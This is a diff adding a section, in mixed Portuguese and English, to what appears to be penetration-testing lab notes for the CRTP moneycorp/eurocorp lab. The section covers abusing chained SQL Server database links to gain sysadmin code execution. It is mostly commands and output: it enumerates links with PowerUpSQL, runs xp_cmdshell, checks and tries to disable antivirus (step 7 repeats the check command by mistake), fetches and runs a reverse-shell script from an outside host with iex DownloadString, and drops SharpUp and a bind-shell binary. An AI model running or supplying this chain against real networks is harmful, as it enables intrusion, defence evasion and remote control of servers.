@@ -3278,3 +3278,179 @@ Invoke-Mimikatz -Command '"Kerberos::golden /user:Administrator /domain:dollarco
 ls \\eurocorp-dc.eurocorp.local\c$
 ls \\eurocorp-dc.eurocorp.local\Sharedwithdcorp
 ```
+##### MIMIKATZ - ATACAR SQL SERVER
+GET A REVERSE SHELL ON A SQL IN EUROCORP FOREST BY ABUSING DATABASE LINKS FROM DCORP-MSSQL.
+
+1. LOAD REQUIREMENTS
+```
+curl http://172.16.99.209/oscp/crtp/PowerUpSQL-master.zip  -Outfile PowerUpSQL-master.zip
+Expand-Archive .\PowerUpSQL-master.zip
+cd .\PowerUpSQL-master\
+cd .\PowerUpSQL-master\
+import-module .\PowerUpSQL.psd1
+```
+2. ENUMERATE SQL SERVERS IN THE DOMAIN AND VERIFY IF STUDENT209 HAS PRIVILEGES TO CONNECT TO ANY OF THEM:
+```
+Get-SQLInstanceDomain | Get-SQLServerINfo -Verbose
+```
+EXEMPLO:
+```
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : DCORP-MSSQL
+DomainName             : dcorp
+ServiceProcessID       : 1688
+ServiceName            : MSSQLSERVER
+ServiceAccount         : NT AUTHORITY\NETWORKSERVICE
+AuthenticationMode     : Windows and SQL Server Authentication
+ForcedEncryption       : 0
+Clustered              : No
+SQLServerVersionNumber : 14.0.1000.169
+SQLServerMajorVersion  : 2017
+SQLServerEdition       : Developer Edition (64-bit)
+SQLServerServicePack   : RTM
+OSArchitecture         : X64
+OsVersionNumber        : SQL
+Currentlogin           : dcorp\student209
+IsSysadmin             : No
+ActiveSessions         : 1
+```
+3. VERIFICAR LINKS SQL
+```
+Get-SQLServerLink -Instance dcorp-mssql.dollarcorp.moneycorp.local 
+```
+EXEMPLO:
+```
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : dcorp-mssql.dollarcorp.moneycorp.local
+DatabaseLinkId         : 0
+DatabaseLinkName       : DCORP-MSSQL
+DatabaseLinkLocation   : Local
+Product                : SQL Server
+Provider               : SQLNCLI
+Catalog                :
+LocalLogin             :
+RemoteLoginName        :
+is_rpc_out_enabled     : True
+is_data_access_enabled : False
+modify_date            : 2/17/2019 5:21:09 AM
+
+ComputerName           : dcorp-mssql.dollarcorp.moneycorp.local
+Instance               : dcorp-mssql.dollarcorp.moneycorp.local
+DatabaseLinkId         : 1
+DatabaseLinkName       : DCORP-SQL1    ***TENHO LINK AQUI
+DatabaseLinkLocation   : Remote
+Product                : SQL Server
+Provider               : SQLNCLI
+Catalog                :
+LocalLogin             :
+RemoteLoginName        :
+is_rpc_out_enabled     : False
+is_data_access_enabled : True
+modify_date            : 2/19/2019 8:37:34 AM	
+```
+4. CRAWL ALL THE CHAINED LINKS
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Verbose
+```
+EXEMPLO: 
+```	
+Version     : SQL Server 2017
+Instance    : DCORP-MSSQL
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL}
+User        : dcorp\student209
+Links       : {DCORP-SQL1}
+
+Version     : SQL Server 2017
+Instance    : DCORP-SQL1
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1}
+User        : dblinkuser
+Links       : {DCORP-MGMT}
+
+Version     : SQL Server 2017
+Instance    : DCORP-MGMT
+CustomQuery :
+Sysadmin    : 0
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}
+User        : sqluser
+Links       : {EU-SQL.EU.EUROCORP.LOCAL}
+
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery :
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa       ***SA AQUI***
+Links       :
+```
+5. TESTAR COMANDO AUTOMATICAMENTE:
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'"
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'" | ft
+```
+EXEMPLO:
+```	
+Version     : SQL Server 2017
+Instance    : EU-SQL
+CustomQuery : {nt authority\network service, }   ***RODOU O COMANDO DE SISTEMA
+Sysadmin    : 1
+Path        : {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL}
+User        : sa
+Links       :
+```
+```
+Version          Instance    CustomQuery                      Sysadmin Path                                                            User             Links
+-------          --------    -----------                      -------- ----                                                            ----             -----
+SQL Server 2017  DCORP-MSSQL                                         0 {DCORP-MSSQL}                                                   dcorp\student209 {DCORP-SQL1}
+SQL Server 2017  DCORP-SQL1                                          0 {DCORP-MSSQL, DCORP-SQL1}                                       dblinkuser       {DCORP-MGMT}
+SQL Server 2017  DCORP-MGMT                                          0 {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT}                           sqluser          {EU-SQL.EU.EUROCORP.LOCAL}
+SQL Server 2017  EU-SQL      {nt authority\network service, }        1 {DCORP-MSSQL, DCORP-SQL1, DCORP-MGMT, EU-SQL.EU.EUROCORP.LOCAL} sa
+```
+6. VERIFICAR SE O ANTIVIRUS ESTA DESABILITADO:
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'powershell Get-MpPreference | findstr /I realtime'" | ft
+```
+7. DESABILTAR O ANTIVIRUS: 
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'powershell Get-MpPreference | findstr /I realtime'" | ft
+```
+8. INICIAR UMA CONEXÃO REMOTA:
+```
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell iex (New-Object Net.WebClient).DownloadString(''http://172.16.99.209/oscp/Invoke-PowerShellTcp3.ps1'')"'
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami'" | ft	
+```
+OUTROS COMANDOS EXTRA:
+```
+MINHAS PERMISSÕES:
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'whoami /priv'" | select -expand CustomQuery
+
+PRIVILEGE ESCALATION:
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell curl http://172.16.99.209/oscp/SharpUp.exe -outfile C:\WINDOWS\Temp\SharpUp.exe"'
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'C:\WINDOWS\Temp\SharpUp.exe'" | select -expand CustomQuery
+
+VERIFICAR STATUS DO AV:
+
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'powershell Get-MpPreference'" | select -expand CustomQuery
+
+VERIFICAR STATUS DO FIREWALl:
+
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'powershell get-netfirewallprofile'" | select -expand CustomQuery
+
+MEU SHELL BIND (MYTCP)
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query 'exec master..xp_cmdshell "powershell curl http://172.16.99.209/oscp/mytcp.exe -outfile C:\WINDOWS\Temp\mytcp.exe"'
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'cmd /c C:\WINDOWS\Temp\mytcp.exe'" | select -expand CustomQuery
+
+MATAR UMA TAREFA:
+Get-SQLServerLinkCrawl -Instance dcorp-mssql.dollarcorp.moneycorp.local -Query "exec master..xp_cmdshell 'cmd /c taskkill /f /im cmd.exe'" | select -expand CustomQuery
+```
+OPCIONAL: DOWNLOAD HEIDISQL CLIENT:
+```
+curl http://172.16.99.209/oscp/crtp/HeidiSQL_9.4_Portable.zip  -Outfile HeidiSQL_9.4_Portable.zip
+Expand-Archive .\HeidiSQL_9.4_Portable.zip
+cd .\HeidiSQL_9.4_Portable\
+.\heidisql.exe
+```	
+	
